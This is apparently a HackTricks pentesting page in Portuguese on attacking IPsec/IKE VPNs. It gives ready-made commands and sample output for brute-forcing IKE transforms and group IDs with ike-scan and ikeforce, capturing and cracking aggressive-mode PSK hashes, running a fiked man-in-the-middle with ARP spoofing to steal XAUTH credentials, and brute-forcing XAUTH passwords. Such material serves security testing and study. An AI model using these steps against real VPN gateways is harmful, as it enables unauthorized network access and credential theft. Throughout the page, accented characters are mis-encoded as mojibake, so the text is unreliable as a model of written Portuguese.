# Informa√ß√µes B√°sicas

IPsec √© a tecnologia mais comumente usada tanto para solu√ß√µes de VPN empresarial gateway-to-gateway (LAN-to-LAN) quanto para host-to-gateway (acesso remoto).

**IKE √© um tipo de implementa√ß√£o ISAKMP** (Internet Security Association Key Management Protocol), que √© um framework para autentica√ß√£o e troca de chaves. O IKE estabelece a associa√ß√£o de seguran√ßa (SA) entre dois pontos finais por meio de um processo de tr√™s fases:

* **Fase 1:** Estabelecer um canal seguro entre 2 pontos finais usando uma chave pr√©-compartilhada (PSK) ou certificados. Pode usar o modo principal (3 pares de mensagens) ou **modo agressivo**.
* **Fase 1.5:** Isso √© opcional, √© chamado de Fase de Autentica√ß√£o Estendida e autentica o usu√°rio que est√° tentando se conectar (usu√°rio+senha).
* **Fase 2:** Negocia o par√¢metro para a seguran√ßa dos dados usando ESP e AH. Pode usar um algoritmo diferente do usado na fase 1 (Perfect Forward Secrecy (PFS)).

**Porta padr√£o:** 500/udp

# **Descubra** o servi√ßo usando nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
# **Encontrando uma transforma√ß√£o v√°lida**

A configura√ß√£o do IPSec pode ser preparada apenas para aceitar uma ou algumas transforma√ß√µes. Uma transforma√ß√£o √© uma combina√ß√£o de valores. **Cada transforma√ß√£o** cont√©m um n√∫mero de atributos como DES ou 3DES como o **algoritmo de criptografia**, SHA ou MD5 como o **algoritmo de integridade**, uma chave pr√©-compartilhada como o tipo de **autentica√ß√£o**, Diffie-Hellman 1 ou 2 como o algoritmo de **distribui√ß√£o de chave** e 28800 segundos como o **tempo de vida**.

Ent√£o, a primeira coisa que voc√™ tem que fazer √© **encontrar uma transforma√ß√£o v√°lida**, para que o servidor converse com voc√™. Para fazer isso, voc√™ pode usar a ferramenta **ike-scan**. Por padr√£o, o Ike-scan funciona no modo principal e envia um pacote para o gateway com um cabe√ßalho ISAKMP e uma √∫nica proposta com **oito transforma√ß√µes dentro dela**.

Dependendo da resposta, voc√™ pode obter algumas informa√ß√µes sobre o endpoint:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
    HDR=(CKY-R=d90bf054d6b76401)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)
 
Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Como voc√™ pode ver na resposta anterior, h√° um campo chamado **AUTH** com o valor **PSK**. Isso significa que a VPN est√° configurada usando uma chave pr√©-compartilhada (e isso √© realmente bom para um pentester).\
**O valor da √∫ltima linha tamb√©m √© muito importante:**

* _0 handshake retornado; 0 notifica√ß√£o retornada:_ Isso significa que o alvo **n√£o √© um gateway IPsec**.
* _**1 handshake retornado; 0 notifica√ß√£o retornada:**_ Isso significa que o **alvo est√° configurado para IPsec e est√° disposto a realizar a negocia√ß√£o IKE, e uma ou mais das transforma√ß√µes que voc√™ prop√¥s s√£o aceit√°veis** (uma transforma√ß√£o v√°lida ser√° mostrada na sa√≠da).
* _0 handshake retornado; 1 notifica√ß√£o retornada:_ Os gateways VPN respondem com uma mensagem de notifica√ß√£o quando **nenhuma das transforma√ß√µes √© aceit√°vel** (embora alguns gateways n√£o o fa√ßam, nesse caso, uma an√°lise adicional e uma proposta revisada devem ser tentadas).

Ent√£o, neste caso, j√° temos uma transforma√ß√£o v√°lida, mas se voc√™ estiver no terceiro caso, precisar√° **fazer um pouco de for√ßa bruta para encontrar uma transforma√ß√£o v√°lida:**

Em primeiro lugar, voc√™ precisa criar todas as transforma√ß√µes poss√≠veis:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
E ent√£o fazer brute-force em cada um usando o ike-scan (isso pode levar v√°rios minutos):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Se a for√ßa bruta n√£o funcionou, talvez o servidor esteja respondendo sem apertos de m√£o mesmo para transforma√ß√µes v√°lidas. Nesse caso, voc√™ pode tentar a mesma for√ßa bruta, mas usando o modo agressivo:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Felizmente, **uma transforma√ß√£o v√°lida √© ecoada de volta**.\
Voc√™ pode tentar **o mesmo ataque** usando [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Voc√™ tamb√©m pode tentar for√ßar transforma√ß√µes com [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

No **Grupo DH: 14 = MODP de 2048 bits** e **15 = 3072 bits**\
**2 = HMAC-SHA = SHA1 (neste caso). O formato --trans √© $Enc,$Hash,$Auth,$DH**

A Cisco recomenda evitar especialmente os grupos DH 1 e 2. Os autores do artigo descrevem como √© prov√°vel que **estados-na√ß√£o possam decifrar sess√µes IPsec negociadas usando grupos fracos via pr√©-computa√ß√£o de log discreto**. Os centenas de milh√µes de d√≥lares gastos na pr√©-computa√ß√£o s√£o amortizados atrav√©s da decodifica√ß√£o em tempo real de qualquer sess√£o usando um grupo fraco (1.024 bits ou menor).

## Fingerprinting do servidor

Em seguida, voc√™ pode usar o ike-scan para tentar **descobrir o fornecedor** do dispositivo. A ferramenta envia uma proposta inicial e para de reproduzir. Em seguida, **analisa** a **diferen√ßa de tempo** entre as mensagens recebidas do servidor e o padr√£o de resposta correspondente, o pentester pode identificar com sucesso o fornecedor do gateway VPN. Al√©m disso, alguns servidores VPN usar√£o a carga √∫til opcional **Vendor ID (VID) payload** com IKE.

**Especifique a transforma√ß√£o v√°lida, se necess√°rio** (usando --trans)

Se o IKE descobrir qual √© o fornecedor, ele o imprimir√°:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
    HDR=(CKY-R=4f3ec84731e2214a)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)
 
IKE Backoff Patterns:
 
IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator
 
Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Isso tamb√©m pode ser alcan√ßado com o script do nmap _**ike-version**_

# Encontrando o ID correto (nome do grupo)

Para poder capturar o hash, voc√™ precisa de uma transforma√ß√£o v√°lida que suporte o modo Aggressive e o ID correto (nome do grupo). Provavelmente, voc√™ n√£o saber√° o nome do grupo v√°lido, ent√£o ter√° que for√ßar a entrada.\
Para fazer isso, eu recomendaria 2 m√©todos:

## For√ßando a entrada do ID com ike-scan

Primeiro, tente fazer uma solicita√ß√£o com um ID falso tentando reunir o hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Se **nenhum hash for retornado**, provavelmente este m√©todo de for√ßa bruta funcionar√°. **Se algum hash for retornado, isso significa que um hash falso ser√° enviado de volta para um ID falso, ent√£o este m√©todo n√£o ser√° confi√°vel** para for√ßar a ID. Por exemplo, um hash falso pode ser retornado (isso acontece em vers√µes modernas):

![](<../.gitbook/assets/image (110).png>)

Mas se, como eu disse, nenhum hash for retornado, voc√™ deve tentar for√ßar nomes de grupo comuns usando o ike-scan.

Este script **tentar√° for√ßar IDs poss√≠veis** e retornar√° as IDs onde um handshake v√°lido √© retornado (este ser√° um nome de grupo v√°lido).

Se voc√™ descobriu uma transforma√ß√£o espec√≠fica, adicione-a ao comando ike-scan. E se voc√™ descobriu v√°rias transforma√ß√µes, sinta-se √† vontade para adicionar um novo loop para tentar todas elas (voc√™ deve tentar todas at√© que uma delas esteja funcionando corretamente).

Voc√™ pode usar o [dicion√°rio do ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [o do seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de nomes de grupo comuns para for√ß√°-los:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
## Brutefor√ßando ID com Iker

[**Iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tamb√©m usa o **ike-scan** para for√ßar poss√≠veis nomes de grupo. Ele segue seu pr√≥prio m√©todo para **encontrar um ID v√°lido com base na sa√≠da do ike-scan**.

## Brutefor√ßando ID com ikeforce

[**Ikeforce.py**](https://github.com/SpiderLabs/ikeforce) √© uma ferramenta que pode ser usada para **for√ßar IDs tamb√©m**. Esta ferramenta ir√° **tentar explorar diferentes vulnerabilidades** que poderiam ser usadas para **distinguir entre um ID v√°lido e um n√£o v√°lido** (pode ter falsos positivos e falsos negativos, √© por isso que prefiro usar o m√©todo ike-scan, se poss√≠vel).

Por padr√£o, o **ikeforce** enviar√° no in√≠cio alguns IDs aleat√≥rios para verificar o comportamento do servidor e determinar a t√°tica a ser usada.

* O **primeiro m√©todo** √© for√ßar os nomes de grupo **procurando** pela informa√ß√£o **Dead Peer Detection DPD** dos sistemas Cisco (esta informa√ß√£o s√≥ √© reproduzida pelo servidor se o nome do grupo estiver correto).

* O **segundo m√©todo** dispon√≠vel √© **verificar o n√∫mero de respostas enviadas para cada tentativa** porque √†s vezes mais pacotes s√£o enviados quando o ID correto √© usado.

* O **terceiro m√©todo** consiste em **procurar por "INVALID-ID-INFORMATION" em resposta a um ID incorreto**.

* Finalmente, se o servidor n√£o responder a nada √†s verifica√ß√µes, o **ikeforce** tentar√° for√ßar o servidor e verificar se, quando o ID correto √© enviado, o servidor responde com algum pacote.\
  Obviamente, o objetivo de for√ßar o ID √© obter o **PSK** quando voc√™ tem um ID v√°lido. Ent√£o, com o **ID** e **PSK**, voc√™ ter√° que for√ßar o XAUTH (se estiver habilitado).

Se voc√™ descobriu uma transforma√ß√£o espec√≠fica, adicione-a ao comando ikeforce. E se voc√™ descobriu v√°rias transforma√ß√µes, sinta-se √† vontade para adicionar um novo loop para tentar todas elas (voc√™ deve tentar todas at√© que uma delas esteja funcionando corretamente).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
## Sniffing ID

Tamb√©m √© poss√≠vel obter nomes de usu√°rio v√°lidos ao capturar a conex√£o entre o cliente VPN e o servidor, j√° que o primeiro pacote do modo agressivo contendo o ID do cliente √© enviado sem criptografia (do livro **Network Security Assessment: Know Your Network**)

![](<../.gitbook/assets/image (111).png>)

# Capturando e quebrando o hash

Por fim, se voc√™ encontrou uma **transforma√ß√£o v√°lida** e o **nome do grupo** e se o **modo agressivo √© permitido**, ent√£o voc√™ pode facilmente capturar o hash que pode ser quebrado:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
O hash ser√° salvo dentro de _hash.txt_.

Voc√™ pode usar **psk-crack**, **john** (usando [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) e **hashcat** para **quebrar** o hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
# **XAuth**

A maioria das implementa√ß√µes usa o **modo agressivo IKE com PSK para realizar autentica√ß√£o em grupo**, e **XAUTH para fornecer autentica√ß√£o adicional do usu√°rio** (por meio do Microsoft Active Directory, RADIUS ou similar). No **IKEv2**, **EAP substitui XAUTH** para autenticar usu√°rios.

## MitM na rede local para capturar credenciais

Assim, voc√™ pode capturar os dados do login usando o _fiked_ e ver se h√° algum nome de usu√°rio padr√£o (voc√™ precisa redirecionar o tr√°fego IKE para o `fiked` para sniffing, o que pode ser feito com a ajuda de ARP spoofing, [mais informa√ß√µes](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). O Fiked atuar√° como um ponto de extremidade VPN e capturar√° as credenciais XAuth:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Al√©m disso, usando IPSec, tente fazer um ataque de MitM e bloqueie todo o tr√°fego para a porta 500. Se o t√∫nel IPSec n√£o puder ser estabelecido, talvez o tr√°fego seja enviado sem criptografia.

## For√ßando XAUTH username e senha com ikeforce

Para for√ßar o **XAUTH** (quando voc√™ conhece um nome de grupo v√°lido **id** e o **psk**), voc√™ pode usar um nome de usu√°rio ou uma lista de nomes de usu√°rio e uma lista de senhas:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Desta forma, o ikeforce tentar√° se conectar usando cada combina√ß√£o de nome de usu√°rio:senha.

Se voc√™ encontrou uma ou v√°rias transforma√ß√µes v√°lidas, use-as como nos passos anteriores.

# Autentica√ß√£o com uma VPN IPSEC

No Kali, o **VPNC** √© usado para estabelecer t√∫neis IPsec. Os **perfis** devem estar localizados em **_/etc/vpnc/_** e voc√™ pode usar a ferramenta _**vpnc**_ para cham√°-los.\
Exemplo retirado do livro **Network Security Assessment 3rd Edition**:
```
root@kali:~# cat > /etc/vpnc/vpntest.conf << STOP
IPSec gateway 10.0.0.250
IPSec ID vpntest
IPSec secret groupsecret123
IKE Authmode psk
Xauth username chris
Xauth password tiffers1
STOP
root@kali:~# vpnc vpntest
VPNC started in background (pid: 6980)...
root@kali:~# ifconfig tun0
```
# Material de Refer√™ncia

* [Artigo sobre cracking de PSK](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Escaneando uma Implementa√ß√£o VPN](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)

# Shodan

* `port:500 IKE`


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
